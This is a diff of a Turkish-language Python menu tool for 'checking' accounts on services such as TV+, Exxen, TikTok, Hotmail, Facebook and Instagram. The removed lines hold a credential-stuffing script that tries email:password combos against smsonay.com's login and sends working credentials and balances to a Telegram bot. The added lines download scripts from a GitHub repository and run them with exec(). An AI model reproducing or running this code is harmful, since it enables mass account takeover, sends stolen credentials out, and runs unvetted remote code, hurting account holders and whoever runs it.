@@ -2,41 +2,8 @@ import requests
 import os
 from cfonts import render       
 
-
-Z = '\x1b[1;31m'
-X = '\x1b[1;33m'
-F = '\x1b[2;32m'
-C = '\x1b[1;97m'
-B = '\x1b[2;36m'
-Y = '\x1b[1;34m'
-C = '\x1b[1;97m'
-y = '\x1b[1;35m'
-f = '\x1b[2;35m'
-z = '\x1b[3;33m'
-G = '\x1b[2;36m'
-E = '\x1b[1;31m'
-DS = '\x1b[30m'
-V = '\x1b[1;35m'
-Z = '\x1b[1;31m'
-X = '\x1b[1;33m'
-Z1 = '\x1b[2;31m'
-F = '\x1b[2;32m'
-A = '\x1b[2;34m'
-C = '\x1b[2;35m'
-B = '\x1b[2;36m'
-Y = '\x1b[1;34m'
-M = '\x1b[1;37m'
-S = '\x1b[1;33m'
-U = '\x1b[1;37m'
-Z = '\x1b[1;31m'
-X = '\x1b[1;33m'
-F = '\x1b[2;32m'
-O = '\x1b[38;5;208m'
-BL = '\x1b[38;5;21m'
-YU = '\x1b[38;5;200m'
-
 print("\x1b[1;39m—" * 60)
-logo = render('THOMAS', colors=['green', 'white'], align='center', line_height=0)
+logo = render('ULUS', colors=['green', 'white'], align='center', line_height=0)
 print(logo)  
 print("\x1b[1;39m—" * 60)
 
@@ -55,66 +22,34 @@ print("\x1b[38;5;117m  12\x1b[38;5;231m - Instagram Checker   | \x1b[1;32m aktif
 
 
 
-pss = input (Y+'hangi işlemi yapmak istiyorsunuz :  ')
-os.system('clear')
-print(G)
-
-
-if pss in '1':
-	import requests
-import os
-s = '\033[33m'
-o = '\033[35m'
-r = '\033[32m'
-y = '\033[31m'
-print(f'{s}Dev: @SoryCoder')
-sory = input(f'{o}Combo Yolu Gir: ')
-os.system('clear')
-print(f'{s}Dev: @SoryCoder')
-token = input(f'{o}Token Gir: ')
-os.system('clear')
-print(f'{s}Dev: @SoryCoder')
-ID = input(f'{o}İd Gir: ')
-
-def sorii(email, password):
-    url = "https://www.smsonay.com/ajax/login"
-    soryders = {
-        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-        'x-requested-with': "XMLHttpRequest",
+def shelby():
+    print("\x1b[1;39m—" * 60)
+    secim = input("\x1b[1;36m • Seciminiz : ")
+    baglantilar = {
+        "1": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/tvplus-t1%20%F0%9F%92%AE.py",
+        "2": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/blu-tv%20-t2%F0%9F%92%AE.py",
+        "3": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/exxen-t3%F0%9F%92%AE%20.py",
+        "4": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/Beymen-t4_ninjapy.py",
+        "5": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/tiktok-t4_nvvinjapy.py",
+        "6": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/Bilyoner-5_ninjapy.py",
+        "7": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/hotmailv9_ninjapy.py",
+        "8": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/disney-v_ninjapy.py",
+        "9": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/smsonay-7_ninjapy.py",
+        "10": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/Dsamart_ninjapy.py",
+        "11": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/Facebok%20%3B8%20bbvv_ninjapy.py",
+        "12": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/ig%2C_chcker_ninjapy.py"
+        
     }
-    soribaba = {
-        'email': email,
-        'password': password,
-    }
-    response = requests.post(url, data=soribaba, headers=soryders)
-
+    
+    if secim in baglantilar:
+        thomas(baglantilar[secim])
+    else:
+        print("1 ile 9 arası bir sayı giriniz.")
+        shelby()
+def thomas(url):
     try:
-        result = response.json()
-        if result.get('success'):
-            bakiye = result.get('bakiye', 'unknown')
-            print(f'{r}Giriş Başarılı: {email}:{password} Bakiye: {bakiye}\n@SoryCoder')
-            soryi = f"""
-════════════════
-Mail: {email}
-Şifre: {password}
-Bakiye: {bakiye}
-═════════════════
-By • @SoryCoder"""
-            requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={soryi}')
-        else:
-            print(f'{y}Giriş Başarısız: {email} : {password}\n@SoryCoder')
-
-    except ValueError:
-        print(f'Hata: Geçersiz yanıt alındı: {response.text}')
-
-try:
-    with open(sory, 'r') as dosya:
-        for satir in dosya:
-            parts = satir.strip().split(':')
-            if len(parts) == 2:
-                email, password = parts
-                sorii(email, password)
-            else:
-                print(f'Hatalı format: {satir.strip()}')
-except FileNotFoundError:
-    print('Combo bulunamadı')
+        exec(requests.get(url).text)
+    except Exception as e:
+        print(f"Hata: {e}")
+if __name__ == "__main__":
+    shelby()
